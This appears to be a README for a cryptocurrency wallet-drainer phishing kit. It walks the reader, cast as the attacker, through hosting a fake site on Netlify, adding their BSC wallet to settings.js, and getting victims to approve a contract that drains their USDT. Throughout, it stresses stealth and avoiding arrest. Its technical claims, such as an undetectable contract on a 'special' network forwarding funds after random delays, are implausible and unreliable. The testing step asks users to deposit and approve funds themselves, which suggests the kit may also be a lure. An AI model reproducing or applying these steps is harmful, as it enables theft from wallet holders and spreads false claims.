HOW IT WORKS

VICTIM ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS

The !!! smart contract address !!! appears in the transaction not yours this is for stealth

This script will let you drain usdt from the target address

This is a free community code that anyone can audit or edit with pull request and works as designed its been used by pro hackers for years to steal crypto undetected i didnt write this script im just sharing it to show how hackers steal crypto

go to https://www.netlify.com/ to host or host it on a regular site

Smart contract address will show up in the approve and other buttons not yours for stealth

!!!!!THIS SMART CONTRACT IS ON A SPECIAL ERC NETWORK THAT FOWARDS IT TO YOUR ADDRESS ON THE REAL BSC CHAIN FOR STEALTH THIS CONTRACT WILL NOT SHOW UP ON BSCSCAN!!!!!

THE CONTRACT WILL ONLY DRAIN WALLETS WITH 50 USDT or more for stealth

1. the smart contract will foward the data to you to prevent you from being caught


2. the contract has a 2 hour on average delay for added security it can take up to 48 hours though its randomized                                                                                                    
3. The smart contract is deployed on a custom network for added security it cannot be found by the wallet address the script adds details to a custom blockchain network that will then foward it to you on the bsc network this part is copyrighted

4. the smart contract runs from the script in your fork and is running 24/7 so you have full control


If the victim has less than 50 usdt in there wallet it will not drain to make it harder to detect it waits for the victim to have atleast 50 usdt to test make sure you have atleast 50 usdt

Deploy steps

!!!!!! Make sure you fork it then deploy !!!!!!!

info on how to fork https://www.youtube.com/watch?v=f5grYMXbAV0

!!!!!! Make sure you add your wallet to settings.js file !!!!!!! this is the settings for smart contract

Go to above link to deploy the code once you fork it

Follow the steps on netlify

deploy

Add your wallet to settings.js file use bsc address

Steps you have to do as the attacker (you)

1. fork

2. deploy on netify

3. add bsc wallet to settings.js if you dont the smart contract will not foward it to you

4. go to netify and confirm deployment

5. edit the html file if you want to change the site appearance

Steps that the !!! victim !!! has to do

1.first connect to bnb network

2.Click approve

3.Smart contract gets approved then it will foward the data to the attackers wallet (you)

4.Drain wallet

TESTING (OPTIONAL)

1. To test deposit busd on your wallet of at least 50 dollars or more the smart contract was designed to only drain wallets with value similiar to nft drainers

2. make sure you added your address to settings.js then click approve

3. click on start mining button only send 1 dollar to test

4. wait for smart contract to foward it to you it make take 2-48 hours for stealth

sample site https://subtle-taffy-dca951.netlify.app/

To use all you have to do is put your wallet address in the settings.js file.

After the victim clicks approve it fowards the transaction to the fake contract that then fowards it to the wallet in the settings.js file this is to make sure the attacker doesnt get caught. This prevents the attacker from being caught and arrested, this new stealth feature is a custom code that is copyrighted.
